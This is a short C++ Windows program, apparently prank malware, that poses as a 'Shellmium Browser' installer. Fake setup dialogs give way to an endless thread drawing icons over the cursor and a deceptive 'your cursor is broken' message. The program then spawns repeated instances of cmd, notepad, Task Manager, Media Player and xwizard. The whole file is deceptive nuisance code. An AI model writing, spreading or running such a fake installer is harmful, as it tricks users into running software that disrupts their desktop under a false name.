#include <windows.h>
#include <cmath>
#include <math.h>
#include <time.h>

int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);

DWORD WINAPI draw(LPVOID lpParam)
{
    while(1){
        HDC hdc = GetDC(HWND_DESKTOP);
        int icon_x = GetSystemMetrics(SM_CXICON);
        int icon_y = GetSystemMetrics(SM_CYICON) ;
        POINT cursor;
        GetCursorPos(&cursor);
        DrawIcon(hdc, cursor.x - icon_x, cursor.y - icon_y, LoadCursor(NULL, IDI_APPLICATION));
        ReleaseDC(0, hdc);
    }
}


int main() {
	MessageBoxA(NULL, "Shellmium Browser Setup\r\nPress yes to proceed", "Setup", MB_OK|MB_ICONASTERISK);
	Sleep(5000);
	MessageBoxA(NULL, "Installing...", "Shellmium Browser - Safety at peace.", MB_OK|MB_ICONASTERISK);
	Sleep(5000);
    HANDLE a = CreateThread(0, 0, draw, 0, 0, 0);
  	Sleep(10000);
  	Sleep(1000);
	MessageBoxA(NULL, "Oh no! Your cursor is broken! Most Shellmium installers do that due to weak systems. Do you want to exit the setup?", "Shellmium Browser (Not Responding)", MB_OK|MB_ICONERROR);
	Sleep(5000);
  	system("start cmd");
    system("start notepad");
	system("start taskmgr");
	system("start wmplayer");
	system("start winver");
	system("start whoami");
	system("start whoami");
	system("start notepad");
	system("start taskmgr");
	system("start wmplayer");
    system("start xwizard");
    system("start xwizard");
   system("start xwizard");
    system("start xwizard");
   system("start xwizard");
    system("start xwizard");
   system("start xwizard");
    system("start xwizard");
   system("start xwizard");
    system("start xwizard");
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
  
}


